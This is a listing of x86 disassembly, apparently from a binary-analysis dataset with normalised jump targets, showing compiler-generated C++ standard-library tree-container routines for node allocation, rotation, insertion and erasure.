mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_4241d0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
mov al [ esi + 0x35 ]
test al al
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
lea ecx [ ecx ]
mov esi [ esi + 0x8 ]
mov edi esi
mov esi [ esi ]
jmp r-xdata
lea eax [ esi + 0xc ]
push eax
push ebx
call ebp
add esp 0x8
test al al
je r-xdata
pop ebp
pop ebx
mov al [ esi + 0x35 ]
test al al
je r-xdata
sub_424240
mov eax [ ecx ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x11 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x11 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x11 ]
test bl bl
je r-xdata
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_4242a0
mov eax [ ecx ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x11 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x11 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x11 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_424310
mov eax [ ecx ]
mov dl [ eax + 0x35 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x35 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x35 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x35 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x35 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x35 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_424390
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x45 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_4243f0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
mov al [ esi + 0x45 ]
test al al
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
lea ecx [ ecx ]
mov esi [ esi + 0x8 ]
mov edi esi
mov esi [ esi ]
jmp r-xdata
lea eax [ esi + 0xc ]
push eax
push ebx
call ebp
add esp 0x8
test al al
je r-xdata
pop ebp
pop ebx
mov al [ esi + 0x45 ]
test al al
je r-xdata
sub_424460
mov eax [ ecx ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x45 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x45 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x45 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x45 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_424570
push 0xffffffff
push sub_43253b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
push esi
mov esi ecx
mov ecx [ esp + 0x1c ]
mov [ esi ] eax
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] ecx
push eax
lea ecx [ esi + 0xc ]
mov [ esp + 0x8 ] esi
mov [ esi + 0x8 ] edx
call sub_423bf0
xor eax eax
mov [ esp + 0x10 ] eax
mov cl [ esp + 0x28 ]
mov [ esi + 0x44 ] cl
mov [ esi + 0x45 ] al
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x14
sub_424740
push ebp
mov ebp esp
push 0xffffffff
push sub_432561
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x14
call sub_42e3bc
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_423a00
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_424880
push ebp
mov ebp esp
push 0xffffffff
push sub_432570
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x38
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x18 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] eax
cmp eax edx
je r-xdata
mov ebx 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x24 ] edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx edx
je r-xdata
mov [ eax ] edx
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0x2c ] edx
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x30 ] ecx
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x34 ] bl
mov [ eax + 0x35 ] dl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edx
sub_424930
push ebp
mov ebp esp
push 0xffffffff
push sub_432580
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x14
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x18 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] eax
cmp eax edx
je r-xdata
mov ebx 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x24 ] edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx edx
je r-xdata
mov [ eax ] edx
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0x2c ] edx
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x30 ] ecx
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x10 ] bl
mov [ eax + 0x11 ] dl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edx
sub_4249e0
push ebp
mov ebp esp
push 0xffffffff
push sub_4325a1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x48
call sub_42e3bc
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_424570
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_424a80
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x11 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_424a80
mov esi [ esi ]
push edi
call ??3@YAXPAX@Z
mov al [ esi + 0x11 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_424ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_4325b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x48
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x18 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] eax
cmp eax edx
je r-xdata
mov ebx 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x24 ] edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx edx
je r-xdata
mov [ eax ] edx
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0x2c ] edx
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x30 ] ecx
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x44 ] bl
mov [ eax + 0x45 ] dl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edx
sub_424b80
mov eax [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0x14 ]
inc [ esi ]
lea ecx [ esp + 0xc ]
call sub_424310
cmp [ esp + 0xc ] edi
jne r-xdata
pop esi
sub_424bb0
mov eax [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0x14 ]
inc [ esi ]
lea ecx [ esp + 0xc ]
call sub_424460
cmp [ esp + 0xc ] edi
jne r-xdata
pop esi
sub_424be0
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov esi ecx
call sub_4241d0
push edi
mov ecx esi
mov ebx eax
call sub_423fb0
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ ecx ] eax
mov [ ecx + 0x4 ] ebx
mov eax ecx
pop ebx
retn 0x8
sub_424c10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4325c9
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x3ffffffe
jb r-xdata
mov edx [ esp + 0x64 ]
mov eax [ edi + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x68 ]
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_424740
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
push r--data
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x50 ] 0x0
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_403fa0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call _CxxThrowException
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x10 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ esp + 0x60 ]
mov [ edx + 0x10 ] bl
pop esi
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebx
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
mov edi edi
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ ecx + 0x10 ] bl
mov [ edx + 0x10 ] bl
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx ]
jne r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov cl [ edx + 0x10 ]
test cl cl
lea eax [ esi + 0x4 ]
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x10 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_424020
mov esi ecx
push esi
mov ecx edi
call sub_424080
mov eax [ esi + 0x4 ]
mov [ eax + 0x10 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_424080
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_424020
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_424de0
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov esi ecx
call sub_4243f0
push edi
mov ecx esi
mov ebx eax
call sub_424100
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ ecx ] eax
mov [ ecx + 0x4 ] ebx
mov eax ecx
pop ebx
retn 0x8
sub_424e20
push esi
mov esi ecx
call sub_424880
mov [ esi + 0x4 ] eax
mov [ eax + 0x35 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
pop esi
retn
sub_424e60
push esi
mov esi ecx
call sub_424930
mov [ esi + 0x4 ] eax
mov [ eax + 0x11 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
pop esi
retn
sub_424ea0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4325e9
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x4924923
jb r-xdata
mov edx [ esp + 0x64 ]
mov eax [ edi + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x68 ]
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_4249e0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
push r--data
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x50 ] 0x0
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_403fa0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call _CxxThrowException
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x44 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ esp + 0x60 ]
mov [ edx + 0x44 ] bl
pop esi
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebx
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
mov edi edi
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x44 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ ecx + 0x44 ] bl
mov [ edx + 0x44 ] bl
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x44 ] 0x0
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx ]
jne r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov cl [ edx + 0x44 ]
test cl cl
lea eax [ esi + 0x4 ]
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x44 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x44 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_424390
mov esi ecx
push esi
mov ecx edi
call sub_423950
mov eax [ esi + 0x4 ]
mov [ eax + 0x44 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x44 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_423950
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_424390
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_425040
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_432609
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebp
mov ebp ecx
mov cl [ eax + 0x11 ]
test cl cl
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea ecx [ esp + 0x6c ]
mov [ esp + 0x10 ] ebx
call sub_4242a0
mov eax [ ebx ]
mov cl [ eax + 0x11 ]
test cl cl
je r-xdata
push r--data
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x54 ] 0x0
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_40af50
push r--data
lea ecx [ esp + 0x28 ]
push ecx
call _CxxThrowException
mov edx [ ebx + 0x8 ]
mov cl [ edx + 0x11 ]
test cl cl
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x6c ]
cmp ecx ebx
mov edi [ ecx + 0x8 ]
jne r-xdata
mov edi eax
jmp r-xdata
mov al [ edi + 0x11 ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
mov edx [ ebx ]
mov [ ecx ] edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
mov al [ edi + 0x11 ]
test al al
mov esi [ ecx + 0x4 ]
jne r-xdata
mov esi ecx
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ebx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edi + 0x4 ] esi
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov ebx [ ebp + 0x4 ]
mov eax [ ebx ]
cmp eax [ esp + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp [ ebx + 0x8 ] ecx
jne r-xdata
mov al [ edi + 0x11 ]
test al al
je r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov dl [ ebx + 0x10 ]
mov al [ ecx + 0x10 ]
mov [ ecx + 0x10 ] dl
mov [ ebx + 0x10 ] al
mov eax [ esp + 0x10 ]
mov cl [ eax + 0x10 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ edi + 0x11 ]
test al al
je r-xdata
push edi
call sub_423ac0
add esp 0x4
mov eax esi
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
call ??3@YAXPAX@Z
mov eax [ ebp + 0x8 ]
add esp 0x4
test eax eax
pop edi
pop esi
pop ebx
jbe r-xdata
mov ecx [ ebp + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
push edi
call sub_423aa0
add esp 0x4
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx ] eax
mov ecx [ esp + 0x60 ]
mov eax [ esp + 0x5c ]
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x54
retn 0x8
dec eax
mov [ ebp + 0x8 ] eax
mov [ edi + 0x10 ] bl
cmp [ edi + 0x10 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
mov cl [ eax + 0x10 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x10 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x11 ]
test cl cl
jne r-xdata
mov [ eax + 0x10 ] bl
push esi
mov ecx ebp
mov [ esi + 0x10 ] 0x0
call sub_424080
mov eax [ esi ]
mov cl [ eax + 0x11 ]
test cl cl
jne r-xdata
mov [ eax + 0x10 ] bl
push esi
mov ecx ebp
mov [ esi + 0x10 ] 0x0
call sub_424020
mov eax [ esi + 0x8 ]
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x4 ]
mov edi esi
cmp edi eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x10 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x10 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x10 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x10 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x10 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x10 ] bl
je r-xdata
mov cl [ esi + 0x10 ]
mov [ eax + 0x10 ] cl
mov [ esi + 0x10 ] bl
mov edx [ eax ]
push esi
mov ecx ebp
mov [ edx + 0x10 ] bl
call sub_424080
mov edx [ eax + 0x8 ]
mov [ edx + 0x10 ] bl
push eax
mov ecx ebp
mov [ eax + 0x10 ] 0x0
call sub_424020
mov eax [ esi ]
mov [ eax + 0x10 ] 0x0
mov cl [ esi + 0x10 ]
mov [ eax + 0x10 ] cl
mov [ esi + 0x10 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx ebp
mov [ edx + 0x10 ] bl
call sub_424020
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x10 ] bl
push eax
mov ecx ebp
mov [ eax + 0x10 ] 0x0
call sub_424080
mov eax [ esi + 0x8 ]
sub_4252e0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_424a80
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
pop esi
retn
sub_425310
push esi
mov esi ecx
call sub_424ac0
mov [ esi + 0x4 ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
pop esi
retn
sub_425360
mov eax [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
mov [ esp + 0x8 ] eax
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0x14 ]
jmp r-xdata
inc [ esi ]
lea ecx [ esp + 0xc ]
call sub_424310
cmp [ esp + 0xc ] edi
jne r-xdata
pop esi
sub_4253a0
mov eax [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
mov [ esp + 0x8 ] eax
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0x14 ]
jmp r-xdata
inc [ esi ]
lea ecx [ esp + 0xc ]
call sub_424460
cmp [ esp + 0xc ] edi
jne r-xdata
pop esi
sub_4253e0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
mov esi ecx
call sub_4241d0
push edi
mov ecx esi
mov ebx eax
call sub_423fb0
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push eax
mov [ esp + 0x1c ] 0x0
call sub_425360
mov eax [ esp + 0x1c ]
add esp 0xc
pop edi
pop esi
pop ebx
retn 0x4
sub_425420
push ecx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
mov cl 0x1
mov [ esp + 0xc ] cl
jne r-xdata
test cl cl
mov edx esi
